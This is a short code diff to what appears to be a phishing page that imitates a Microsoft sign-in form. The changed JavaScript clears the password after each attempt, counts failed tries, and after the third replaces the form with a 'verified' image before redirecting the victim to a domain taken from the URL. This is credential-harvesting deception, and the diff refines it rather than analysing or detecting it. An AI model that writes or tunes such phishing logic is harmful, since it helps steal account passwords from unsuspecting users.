@@ -121,7 +121,7 @@ document.getElementById("microsoft-login-form").addEventListener("submit", funct
                     // Clear password field
                     document.getElementById("password").value = ""; // Clear password field
                     // Check if error count is 3, then redirect
-                    if (errorCount === 2) {
+                    if (errorCount === 3) {
                         // Replace the form with the verified image
                         replaceWithVerifiedImage();
                         // Redirect to domain at the end of the URL after 3 seconds
